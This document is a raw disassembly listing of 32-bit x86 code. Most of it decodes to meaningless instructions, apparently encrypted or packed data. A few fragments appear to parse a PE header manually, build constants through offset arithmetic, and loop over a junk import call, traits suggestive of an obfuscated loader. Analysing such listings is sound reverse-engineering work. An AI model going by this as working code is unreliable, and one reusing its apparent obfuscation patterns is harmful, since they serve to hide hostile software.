  41117c:	add    ebp,edi
  41117e:	inc    BYTE PTR [esi-0x7622c1a6]
  411184:	dec    edi
  411185:	iret   
  411186:	mov    dh,0xd8
  411188:	adc    ebp,DWORD PTR [ecx]
  41118a:	into   
  41118b:	sbb    eax,0x7382c067
  411190:	xchg   ebx,eax
  411191:	mov    dh,0x1e
  411193:	push   es
  411194:	mov    esp,0x488da566
  411199:	sbb    DWORD PTR [esi-0x70],0xffffffe0
  41119d:	imul   ecx,ebx,0x18
  4111a0:	cli    
  4111a1:	outs   dx,BYTE PTR ds:[esi]
  4111a2:	cli    
  4111a3:	dec    eax
  4111a4:	mov    WORD PTR [ebx],cs
  4111a6:	enter  0x46e0,0x9a
  4111aa:	loope  0x41113a
  4111ac:	add    DWORD PTR [esi+edx*8],ebp
  4111af:	shl    BYTE PTR [edx+ecx*1],0x2e
  4111b3:	mov    ecx,0x93638634
  4111b8:	fdecstp 
  4111ba:	sbb    al,0x2d
  4111bc:	pop    esi
  4111bd:	into   
  4111be:	or     DWORD PTR [ecx],edi
  4111c0:	sbb    BYTE PTR [ebx+0x412c4c7c],dh
  4111c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111c7:	loope  0x411199
  4111c9:	sbb    al,0x69
  4111cb:	imul   eax,edi,0x5
  4111ce:	xor    eax,0x41ced49c
  4111d3:	inc    esp
  4111d4:	cmp    eax,0xc7be802
  4111d9:	js     0x411257
  4111db:	das    
  4111dc:	adc    al,0xa8
  4111de:	and    al,0x92
  4111e0:	xor    bl,BYTE PTR [edx]
  4111e2:	fmul   QWORD PTR [eax+0x798af751]
  4111e8:	sbb    BYTE PTR [ebp+0x474b8550],al
  4111ee:	mov    BYTE PTR [edi+0x27f240fd],bh
  4111f4:	mov    DWORD PTR [ebx],0x794220a1
  4111fa:	mov    ebp,0x1fede214
  4111ff:	xchg   ch,dh
  411201:	jmp    0x41118d
  411203:	xchg   ebx,eax
  411204:	aas    
  411205:	adc    al,0x32
  411207:	aam    0x6d
  411209:	jns    0x411285
  41120b:	sti    
  41120c:	sub    al,0xce
  41120e:	mov    al,0x7d
  411210:	cmp    eax,0x253741db
  411215:	pop    ss
  411216:	xchg   ecx,eax
  411217:	js     0x411259
  411219:	in     eax,dx
  41121a:	xor    BYTE PTR [edx+0x6],dl
  41121d:	or     bl,BYTE PTR [edi+0x6aa7ee35]
  411223:	mov    al,ds:0xe2685704
  411228:	loop   0x41128f
  41122a:	(bad)  
  41122b:	or     bh,dh
  41122d:	or     eax,0x7b6feb6
  411232:	shl    BYTE PTR [ebx+0x16],0x28
  411236:	call   0x7948:0x620dc06f
  41123d:	sbb    eax,0x8069722f
  411242:	out    0xeb,eax
  411244:	dec    edi
  411245:	pop    edi
  411246:	sub    BYTE PTR [esi],ch
  411248:	enter  0xe42a,0xbc
  41124c:	hlt    
  41124d:	out    0xe5,al
  41124f:	fs out dx,al
  411251:	cwde   
  411252:	xchg   edx,eax
  411253:	repz jle 0x4112a1
  411256:	mov    ecx,ds
  411258:	das    
  411259:	in     al,dx
  41125a:	xor    DWORD PTR [esp+eax*2+0x429c717d],0x62
  411262:	jg     0x41125f
  411264:	sbb    esi,esi
  411266:	retf   
  411267:	in     eax,dx
  411268:	jmp    0x3c671fff
  41126d:	ds dec edx
  41126f:	fstp   DWORD PTR [ecx]
  411271:	iret   
  411272:	pop    esi
  411273:	xchg   esi,eax
  411274:	pop    ebx
  411275:	retf   
  411276:	std    
  411277:	jns    0x411217
  411279:	cmp    DWORD PTR [edx],ecx
  41127b:	jb     0x41127a
  41127d:	jae    0x4112ae
  41127f:	or     eax,0xe4f2ae34
  411284:	ins    DWORD PTR es:[edi],dx
  411285:	cs aad 0x2f
  411288:	aas    
  411289:	pushf  
  41128a:	not    DWORD PTR [esi+0x15c533b0]
  411290:	ficomp DWORD PTR [esi+0x56]
  411293:	loopne 0x4112f3
  411295:	cmp    BYTE PTR ds:0x9264bec1,al
  41129b:	dec    ecx
  41129c:	hlt    
  41129d:	test   BYTE PTR [esp+eax*2],ah
  4112a0:	jle    0x411250
  4112a2:	sbb    cl,bh
  4112a4:	xchg   esp,eax
  4112a5:	add    al,0x56
  4112a7:	hlt    
  4112a8:	cli    
  4112a9:	(bad)  
  4112aa:	jge    0x411289
  4112ac:	ins    BYTE PTR es:[edi],dx
  4112ad:	call   FWORD PTR [edx+0x45]
  4112b0:	sbb    al,0x8a
  4112b2:	cmp    BYTE PTR [edi-0x6c],ch
  4112b5:	fisub  DWORD PTR [ebp-0x6bdb2e27]
  4112bb:	sub    ah,BYTE PTR [esi-0x24]
  4112be:	out    0x81,eax
  4112c0:	push   0xffffff9c
  4112c2:	jae    0x41133f
  4112c4:	bswap  eax
  4112c6:	pop    eax
  4112c7:	rol    DWORD PTR [ebx+0x46011ca6],1
  4112cd:	mov    ch,0x76
  4112cf:	in     eax,0x59
  4112d1:	pushf  
  4112d2:	push   es
  4112d3:	jl     0x411279
  4112d5:	sar    BYTE PTR [edi],0x3a
  4112d8:	loopne 0x411343
  4112da:	ins    DWORD PTR es:[edi],dx
  4112db:	add    eax,0xa652560c
  4112e0:	sbb    edx,ebp
  4112e2:	dec    esi
  4112e3:	dec    ebx
  4112e4:	pop    esi
  4112e5:	xchg   ebx,ebp
  4112e7:	je     0x4115eb
  4112ed:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x6068f61e,eax
  411318:	dec    edi
  411319:	or     esp,DWORD PTR [ecx+0x49]
  41131c:	inc    ebp
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x411351
  411324:	push   esi
  411325:	xchg   edx,eax
  411326:	pop    ds
  411327:	sub    eax,0x737f41fd
  41132c:	cmp    al,0x2d
  41132e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41132f:	mov    BYTE PTR ds:0x11940e6a,cl
  411335:	add    eax,0x28ed5b7c
  41133a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41133b:	push   ds
  41133c:	inc    DWORD PTR [ecx-0x6e6e3b27]
  411342:	scas   al,BYTE PTR es:[di]
  411344:	jnp    0x4112f5
  411346:	xchg   BYTE PTR [esi+0x2a0af31c],cl
  41134c:	sbb    edi,DWORD PTR [edi+0x5e]
  41134f:	adc    eax,0xdb1a377f
  411354:	fs in  al,dx
  411356:	pop    eax
  411357:	push   cs
  411358:	test   BYTE PTR [esi-0x33],dh
  41135b:	stos   BYTE PTR es:[edi],al
  41135c:	fwait
  41135d:	mov    al,0xf9
  41135f:	lods   al,BYTE PTR ds:[esi]
  411360:	jb     0x4113ac
  411362:	dec    esp
  411363:	push   eax
  411364:	mov    eax,ds:0x317bb19d
  411369:	test   dl,ch
  41136b:	mov    bh,0xb7
  41136d:	adc    eax,0x816c15af
  411372:	into   
  411373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411374:	sub    eax,0x84b64773
  411379:	or     DWORD PTR [esi],0xf96f7328
  41137f:	pop    ds
  411380:	mov    ch,BYTE PTR [esi-0x36]
  411383:	es jo  0x41133e
  411386:	stc    
  411387:	xor    DWORD PTR [edx+esi*2],esi
  41138a:	xchg   esp,eax
  41138b:	scas   eax,DWORD PTR es:[edi]
  41138c:	sti    
  41138d:	mov    ds:0xb109f7f0,al
  411392:	sub    al,0x56
  411394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411395:	fst    QWORD PTR [edi+ecx*2-0x5b]
  411399:	int    0x4c
  41139b:	dec    ecx
  41139c:	mov    al,ds:0xe765f6d9
  4113a1:	dec    ebp
  4113a2:	add    BYTE PTR [esp+edi*1-0x5c],bl
  4113a6:	es mov ebx,0x9e7d7694
  4113ac:	imul   ebp,DWORD PTR [ecx-0x6a],0x4c2ca2cb
  4113b3:	int3   
  4113b4:	cmp    dh,BYTE PTR [ebx-0xf]
  4113b7:	pushf  
  4113b8:	dec    esp
  4113b9:	mov    ebx,0x852354cb
  4113be:	inc    esp
  4113bf:	pop    ds
  4113c0:	inc    edx
  4113c1:	add    al,0xa1
  4113c3:	inc    esp
  4113c4:	jb     0x4113d4
  4113c6:	mov    ah,0x38
  4113c8:	in     al,dx
  4113c9:	xchg   edi,eax
  4113ca:	inc    ebx
  4113cb:	add    BYTE PTR [ebx+esi*1-0x715f92dc],dh
  4113d2:	sbb    BYTE PTR [edx+0x454a1218],0xaf
  4113d9:	mov    esi,0x77dfb8ac
  4113de:	jg     0x41137e
  4113e0:	adc    al,0x1e
  4113e3:	int3   
  4113e4:	fcmovnu st,st(0)
  4113e6:	pop    edx
  4113e7:	cli    
  4113e8:	int3   
  4113e9:	and    esi,DWORD PTR [esi-0x621f319d]
  4113ef:	fistp  WORD PTR [edx+0x6b]
  4113f2:	sbb    ecx,DWORD PTR ds:0x5a01b098
  4113f8:	xchg   esi,eax
  4113f9:	dec    ecx
  4113fa:	je     0x41139e
  4113fc:	dec    ebx
  4113fd:	ins    BYTE PTR es:[edi],dx
  4113fe:	arpl   WORD PTR [edi+0x6f29cc32],sp
  411404:	fnstenv [eax-0x7c]
  411407:	push   0x2f4b0710
  41140c:	ret    0xd708
  41140f:	and    dh,bl
  411411:	fdiv   st(4),st
  411413:	push   ebx
  411414:	repnz test BYTE PTR [edi+esi*4-0x1564299e],ah
  41141c:	cli    
  41141d:	fst    st(5)
  41141f:	cmp    esi,DWORD PTR [edi+0x7b1bb11f]
  411425:	dec    esi
  411426:	or     DWORD PTR [edx-0x6372a588],0x614f26ef
  411430:	push   ecx
  411431:	pusha  
  411432:	das    
  411433:	shl    esi,1
  411435:	stc    
  411436:	push   ecx
  411437:	mov    BYTE PTR [eax+0xd],ah
  41143a:	pop    ebx
  41143b:	retf   0xf06d
  41143e:	(bad)  
  41143f:	shl    ch,1
  411441:	js     0x411427
  411443:	jl     0x41149a
  411445:	sbb    esi,DWORD PTR [esi]
  411447:	(bad)  
  411448:	pop    di
  41144a:	lahf   
  41144b:	mov    es,esp
  41144d:	lods   eax,DWORD PTR ds:[esi]
  41144e:	jae    0x4114a6
  411450:	xor    BYTE PTR [edx+0x35],bh
  411453:	jb     0x411465
  411455:	imul   edi,DWORD PTR [edi+0x24b6810b],0x30
  41145c:	pop    es
  41145d:	enter  0xdc6b,0x32
  411461:	mov    esp,db2
  411464:	mul    DWORD PTR [edi-0x7d]
  411467:	popf   
  411468:	mov    esi,0x803e65c0
  41146d:	data16 into 
  41146f:	xor    DWORD PTR [ebx+0x37f171b0],esp
  411475:	push   ds
  411476:	or     al,0x6d
  411478:	pop    es
  411479:	(bad)  
  41147a:	stc    
  41147b:	cmp    DWORD PTR [ebp+ebx*8-0x3bf542ba],edi
  411482:	xchg   edx,eax
  411483:	add    al,0x95
  411485:	xchg   edx,eax
  411486:	retf   0x3fd8
  411489:	and    dl,bl
  41148b:	out    0xea,eax
  41148d:	into   
  41148e:	test   eax,0x1005749c
  411493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411494:	jecxz  0x4114f4
  411496:	(bad)  
  411497:	daa    
  411498:	leave  
  411499:	pop    eax
  41149a:	repnz mov dl,0x71
  41149d:	ins    DWORD PTR es:[edi],dx
  41149e:	(bad)  
  4114a0:	mov    dh,0x67
  4114a2:	lds    ecx,FWORD PTR [esi-0x37]
  4114a5:	sub    cl,0xb6
  4114a8:	cmp    cl,BYTE PTR [edx]
  4114aa:	mov    ds:0xb21fc3cc,al
  4114af:	dec    eax
  4114b0:	fidiv  DWORD PTR [ecx-0x59]
  4114b3:	jo     0x4114fc
  4114b5:	push   esi
  4114b6:	loope  0x411495
  4114b8:	pop    DWORD PTR [eax+ebp*2-0x3dcfa39a]
  4114bf:	sub    esi,DWORD PTR [edi+ebx*2]
  4114c2:	dec    ebx
  4114c3:	push   0xda541dab
  4114c8:	mov    al,0xb5
  4114ca:	push   edx
  4114cb:	and    al,0xcc
  4114cd:	daa    
  4114ce:	push   ebp
  4114cf:	sbb    DWORD PTR [ecx-0x8b4d0cd],edx
  4114d5:	lds    esi,FWORD PTR [ecx+edi*8+0x6d4bda74]
  4114dc:	ins    DWORD PTR es:[edi],dx
  4114dd:	pop    ds
  4114de:	arpl   dx,di
  4114e0:	push   ecx
  4114e1:	cwde   
  4114e2:	aaa    
  4114e3:	pop    ebp
  4114e4:	(bad)  
  4114e5:	dec    ch
  4114e7:	or     BYTE PTR [ebx],0xbc
  4114ea:	mov    ds:0x55941926,al
  4114ef:	pop    ebp
  4114f0:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114f2:	mov    esp,0x9a00eb5c
  4114f7:	inc    ebx
  4114f8:	repz dec edi
  4114fa:	pop    edx
  4114fb:	int    0x4b
  4114fd:	stos   DWORD PTR es:[edi],eax
  4114fe:	clc    
  4114ff:	mov    bh,0xe9
  411501:	and    esp,DWORD PTR [edi]
  411503:	nop
  411504:	in     eax,dx
  411505:	jno    0x411496
  411507:	jl     0x41154a
  411509:	out    dx,al
  41150a:	mov    dh,0x8
  41150c:	call   0xd03e:0x4ec3100e
  411513:	stc    
  411514:	push   ss
  411515:	mov    cl,0x51
  411517:	repz add DWORD PTR [ebp-0x4d],esp
  41151b:	loope  0x411541
  41151d:	cmp    al,0xac
  41151f:	nop
  411520:	sahf   
  411521:	into   
  411522:	mov    dh,0xc8
  411524:	fxch   st(4)
  411526:	jno    0x4114b9
  411528:	push   0xb58732
  41152d:	add    dl,BYTE PTR [edi]
  41152f:	sbb    edx,ebp
  411531:	std    
  411532:	jnp    0x41155f
  411534:	shrd   DWORD PTR [esi+ebp*1+0x3d],esp,0x4e
  41153a:	mov    esi,0x1e1aea7d
  41153f:	(bad)  
  411540:	call   0x90fb5a5f
  411545:	arpl   WORD PTR [edi+0x74],ax
  411548:	ins    BYTE PTR es:[edi],dx
  411549:	mov    ch,BYTE PTR [ebx]
  41154b:	nop
  41154c:	cdq    
  41154d:	add    al,0xe5
  41154f:	or     eax,0x6aaa020a
  411554:	sub    BYTE PTR [ecx+0x120045b0],dl
  41155a:	mov    ds:0x1008b639,eax
  41155f:	adc    esi,DWORD PTR [eax]
  411561:	out    dx,eax
  411562:	adc    ecx,ebp
  411564:	pop    eax
  411565:	repnz mov DWORD PTR ss:[ecx+0x48],ebp
  41156a:	add    ebp,DWORD PTR [ecx-0x2a11fb3d]
  411570:	cmc    
  411571:	mov    dl,0x3a
  411573:	xchg   edi,eax
  411574:	das    
  411575:	fs jne 0x411543
  411578:	inc    esi
  411579:	mov    edx,edi
  41157b:	cmp    ebx,eax
  41157d:	int3   
  41157e:	(bad)  
  41157f:	mov    ecx,0xd2e01aeb
  411584:	fisubr DWORD PTR [esi+0x4a]
  411587:	inc    esi
  411588:	fwait
  411589:	aam    0x4
  41158b:	xchg   DWORD PTR [eax],ecx
  41158d:	jns    0x41152a
  41158f:	xchg   ecx,eax
  411590:	iret   
  411591:	jge    0x4115b9
  411593:	call   0xde4650d6
  411598:	lock popf 
  41159a:	out    dx,al
  41159b:	sub    DWORD PTR [ecx],esi
  41159d:	push   0xffffffff
  41159f:	ror    DWORD PTR [edi+0x5],0xff
  4115a3:	(bad)
  4115a6:	fist   WORD PTR [ecx+0x59728ced]
  4115ac:	shl    DWORD PTR [ecx],cl
  4115ae:	aaa    
  4115af:	arpl   bx,cx
  4115b1:	inc    ebx
  4115b2:	xchg   esp,eax
  4115b3:	rcr    DWORD PTR [ecx-0x9c2326],0xf7
  4115ba:	daa    
  4115bb:	jp     0x411597
  4115bd:	fcomp  QWORD PTR [edx]
  4115bf:	xor    BYTE PTR [esi],dl
  4115c1:	(bad)  
  4115c2:	repnz into 
  4115c4:	sub    bl,bl
  4115c6:	rcl    BYTE PTR [edi],cl
  4115c8:	std    
  4115c9:	add    DWORD PTR [esi+0x3eebf3fa],esi
  4115cf:	dec    ebx
  4115d0:	fist   WORD PTR [ecx-0x60]
  4115d3:	mov    bh,0x8b
  4115d5:	push   ebp
  4115d6:	or     BYTE PTR [ebx],dh
  4115d8:	ror    DWORD PTR [ebp+0x729b1084],0x32
  4115df:	add    BYTE PTR [ecx+0x45ff0845],cl
  4115e5:	or     al,0xe9
  4115e7:	sti    
  4115e8:	stc    
  4115e9:	(bad)  
  4115ea:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	or     BYTE PTR [ebp+0x40861259],al
  41161e:	jle    0x41169e
  411620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411621:	jg     0x4116a1
  411623:	jle    0x411677
  411625:	add    eax,0x7d31fef1
  41162a:	(bad)  
  41162b:	push   edi
  41162c:	or     DWORD PTR [esi+ecx*1],esi
  41162f:	jne    0x41164a
  411631:	fsubr  QWORD PTR [ecx-0x3c7e6dbf]
  411637:	unpcklps xmm2,XMMWORD PTR [edi+0x120ffc7e]
  41163e:	sti    
  41163f:	push   ebx
  411640:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411641:	and    ah,BYTE PTR [ebp-0x58]
  411644:	inc    esi
  411645:	pop    edi
  411646:	lock add bl,al
  411649:	sbb    BYTE PTR [esi+0x3d],ah
  41164c:	or     DWORD PTR [esi+edx*2-0x5f931918],edi
  411653:	in     al,0xa2
  411655:	jmp    0xbab3:0xff4a9b27
  41165c:	call   0x74af:0x52446907
  411663:	(bad)  
  411664:	adc    al,0x0
  411666:	dec    esp
  411667:	ds es stos DWORD PTR es:[edi],eax
  41166a:	cdq    
  41166b:	dec    esp
  41166c:	daa    
  41166d:	js     0x41168d
  41166f:	out    0x26,eax
  411671:	dec    ecx
  411672:	leave  
  411673:	sub    eax,0xece7c125
  411678:	push   edx
  411679:	inc    edx
  41167a:	dec    ebx
  41167b:	push   0x8706f914
  411680:	pop    ebp
  411681:	jns    0x411620
  411683:	xchg   BYTE PTR [eax],cl
  411685:	(bad)  
  411686:	cmp    al,0x3d
  411688:	dec    esi
  411689:	fadd   st(3),st
  41168b:	cmp    ebp,esp
  41168d:	setbe  BYTE PTR [ebx-0x49]
  411691:	mov    DWORD PTR [edx-0x7f8b9912],esp
  411697:	jge    0x4116d1
  411699:	fwait
  41169a:	iret   
  41169b:	dec    eax
  41169c:	cli    
  41169d:	mov    cl,0xe4
  41169f:	clc    
  4116a0:	cmp    al,0x6d
  4116a2:	lods   ax,WORD PTR ds:[esi]
  4116a4:	fs hlt 
  4116a6:	push   0xc1e0e97b
  4116ab:	lea    ebx,[edi]
  4116ad:	sbb    DWORD PTR [edi+0xec44bd7],esp
  4116b3:	pop    esp
  4116b4:	gs mov bl,0x1f
  4116b7:	nop
  4116b8:	hlt    
  4116b9:	add    edx,edx
  4116bb:	add    DWORD PTR [eax-0x58782b3d],0xffffffb5
  4116c2:	mov    bh,0x45
  4116c4:	(bad)  ds:[edi+0x1c0f081d]
  4116cb:	pusha  
  4116cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116cd:	into   
  4116ce:	retf   0x63c2
  4116d1:	cmp    al,0xfc
  4116d3:	ret    
  4116d4:	repz sbb edx,DWORD PTR [ecx-0x12]
  4116d8:	mov    edx,0x2e598166
  4116dd:	call   0x5f6c:0x89d8de4b
  4116e4:	sbb    bh,ch
  4116e6:	push   ss
  4116e7:	in     al,dx
  4116e8:	or     BYTE PTR [edi-0x20],ch
  4116eb:	jle    0x411749
  4116ed:	xchg   ebp,eax
  4116ee:	call   0x128:0x55181c99
  4116f5:	fld    DWORD PTR [esi-0x2a]
  4116f8:	mov    esp,0x7d167457
  4116fd:	cwde   
  4116fe:	fcom   QWORD PTR [eax-0x2d2fe6da]
  411704:	loopne 0x411700
  411706:	push   ebx
  411707:	cmp    al,0xb3
  411709:	push   edi
  41170a:	xchg   ebp,eax
  41170b:	ja     0x41172b
  41170d:	push   es
  41170e:	mov    ds:0xe4ae5982,al
  411713:	dec    esi
  411714:	jg     0x411730
  411716:	mov    esp,0x5976521d
  41171b:	xchg   DWORD PTR [edx-0x2a],ecx
  41171e:	lea    edx,[ecx]
  411720:	jle    0x411743
  411722:	adc    BYTE PTR [ebx+0x7a439148],al
  411728:	ins    BYTE PTR es:[edi],dx
  411729:	jg     0x4117aa
  41172b:	and    ebp,DWORD PTR [ecx+0x7bb4b137]
  411731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411732:	jecxz  0x4116f0
  411734:	push   ebx
  411735:	int    0x5b
  411737:	jbe    0x4116fa
  411739:	les    ecx,FWORD PTR [esi+0x704d3363]
  41173f:	push   es
  411740:	xor    eax,0xa9dbf330
  411745:	add    BYTE PTR [edx],bh
  411747:	dec    eax
  411748:	mov    bl,0xcc
  41174a:	iret   
  41174b:	aas    
  41174c:	add    eax,esi
  41174e:	arpl   WORD PTR ds:0xe30abef1,bp
  411754:	pop    ecx
  411755:	cmp    DWORD PTR [ecx],eax
  411757:	aas    
  411758:	in     eax,dx
  411759:	not    DWORD PTR [ebp+0x6ad6795b]
  41175f:	add    cl,BYTE PTR [edx+eax*8-0x9]
  411763:	mul    DWORD PTR [ebp-0x7482eea4]
  411769:	add    eax,0x382443bf
  41176e:	std    
  41176f:	xor    esi,DWORD PTR [edi-0x6]
  411772:	xor    al,0x43
  411774:	sbb    al,0x2f
  411776:	in     al,0x7f
  411778:	out    0x36,al
  41177a:	sbb    eax,DWORD PTR [ebx-0x7]
  41177d:	lds    edi,FWORD PTR [edx-0x42]
  411780:	hlt    
  411781:	ins    BYTE PTR es:[edi],dx
  411782:	test   eax,0x2eb66a5a
  411787:	xchg   DWORD PTR [esp+ebp*4],edx
  41178a:	dec    esp
  41178b:	popa   
  41178c:	pop    eax
  41178d:	jb     0x411765
  41178f:	ins    DWORD PTR es:[edi],dx
  411790:	or     ebp,ecx
  411792:	(bad)  
  411793:	(bad)  
  411794:	stc    
  411795:	sub    edi,DWORD PTR [ebx-0x306b3446]
  41179b:	mov    al,ds:0xf5c92c7d
  4117a0:	mov    BYTE PTR [edx-0x759b617d],ch
  4117a6:	inc    edx
  4117a7:	pusha  
  4117a8:	jp     0x411789
  4117aa:	repz pushw 0x64d1
  4117af:	(bad)  
  4117b0:	iret   
  4117b1:	pop    ebx
  4117b2:	sbb    dl,BYTE PTR [ebx]
  4117b4:	push   eax
  4117b5:	sbb    ebp,DWORD PTR [ebp+ecx*8+0xdab6d8b]
  4117bc:	push   ss
  4117bd:	adc    BYTE PTR [ebx],0xa8
  4117c0:	inc    ebp
  4117c1:	jmp    0x4117b1
  4117c3:	pusha  
  4117c4:	pop    esi
  4117c5:	jb     0x41178c
  4117c7:	inc    edi
  4117c9:	dec    ecx
  4117ca:	sbb    esp,DWORD PTR [ebx+0x28]
  4117cd:	jle    0x41175a
  4117cf:	inc    ebp
  4117d0:	or     bh,al
  4117d2:	add    eax,0x4336a3
  4117d7:	cmp    eax,0x8a000042
  4117dc:	add    BYTE PTR [ecx+0x4335ff2d],al
  4117e2:	add    BYTE PTR [ebp+0x6d],bh
  4117e5:	add    BYTE PTR [eax],al
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43369f,0x433603
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43369f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43361b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4336ab,0x0
  41182f:	mov    eax,ds:0x4336ab
  411834:	inc    eax
  411835:	mov    ds:0x4336ab,eax
  41183a:	cmp    DWORD PTR ds:0x4336ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4337bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4336ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4336ab
  411899:	inc    eax
  41189a:	mov    ds:0x4336ab,eax
  41189f:	cmp    DWORD PTR ds:0x4336ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	repnz inc edx
  4118e9:	mov    cl,0xc8
  4118eb:	sub    al,0x4e
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x411903
  4118f4:	add    eax,0x5d359a74
  4118f9:	or     al,0xeb
  4118fb:	clc    
  4118fc:	outs   dx,BYTE PTR ds:[esi]
  4118fd:	mov    esi,0x1d1397dc
  411902:	iret   
  411903:	or     BYTE PTR [ebx+eiz*4-0x5b],0xcd
  411908:	test   eax,0xa809c8d2
  41190d:	jno    0x4118c1
  41190f:	ins    DWORD PTR es:[edi],dx
  411910:	sbb    WORD PTR [ecx+ebp*8+0x677411f0],bx
  411918:	dec    ebx
  411919:	cmc    
  41191a:	inc    ebp
  41191b:	fs jge 0x411972
  41191e:	jns    0x41199e
  411920:	jae    0x411903
  411922:	fdivr  QWORD PTR [edi+0x29306a14]
  411928:	sti    
  411929:	xchg   ebx,eax
  41192a:	aam    0x28
  41192c:	xor    eax,0x9813c66f
  411931:	ror    BYTE PTR [ecx-0x36],0xe9
  411935:	jecxz  0x411951
  411937:	xchg   ebx,eax
  411938:	inc    esp
  411939:	adc    esi,DWORD PTR ss:[edi+ebp*1+0x663e8ba]
  411941:	dec    ecx
  411942:	sbb    al,0xee
  411944:	or     dh,cl
  411946:	xchg   edi,eax
  411947:	xor    DWORD PTR [edx+0x2d],eax
  41194a:	pop    esp
  41194b:	mov    bl,dl
  41194d:	jmp    0xd7becefc
  411952:	fistp  QWORD PTR [esi-0xa]
  411955:	test   al,0xf0
  411957:	aas    
  411958:	out    0xda,eax
  41195a:	es push es
  41195c:	mov    bl,BYTE PTR [edi+0x2e]
  41195f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411960:	sub    eax,edx
  411962:	loop   0x411907
  411964:	dec    ecx
  411965:	je     0x4119a4
  411967:	jns    0x4119be
  411969:	mov    ah,0x44
  41196b:	dec    esp
  41196c:	das    
  41196d:	je     0x41190a
  41196f:	and    BYTE PTR [eax+0x7c],al
  411972:	int3   
  411973:	les    eax,FWORD PTR [edi]
  411975:	pop    eax
  411976:	ja     0x41199b
  411978:	adc    ch,BYTE PTR [esi+0x31]
  41197b:	xor    bh,BYTE PTR [ebx]
  41197d:	ret    
  41197e:	stos   DWORD PTR es:[edi],eax
  41197f:	pusha  
  411980:	repz sbb eax,0xa25d8c55
  411986:	add    eax,0xecc86c4a
  41198b:	xchg   edx,eax
  41198c:	int    0x25
  41198e:	(bad)  
  41198f:	retf   
  411990:	pop    ecx
  411991:	mov    gs,WORD PTR [eax-0x6a]
  411994:	lock dec esp
  411996:	inc    esp
  411997:	adc    dh,BYTE PTR [edi+0x45]
  41199a:	sti    
  41199b:	or     BYTE PTR ds:0xbb132b7f,ch
  4119a1:	push   ecx
  4119a2:	and    ah,dl
  4119a4:	cmc    
  4119a5:	cmp    edi,ebx
  4119a7:	cdq    
  4119a8:	inc    ebx
  4119a9:	dec    ebp
  4119aa:	cwde   
  4119ab:	aam    0xb3
  4119ad:	jo     0x411940
  4119af:	(bad)  [edi]
  4119b1:	fsubr  st,st(7)
  4119b3:	in     al,0xbc
  4119b5:	add    ah,bh
  4119b7:	rcl    BYTE PTR [edi+0x20e0df2b],1
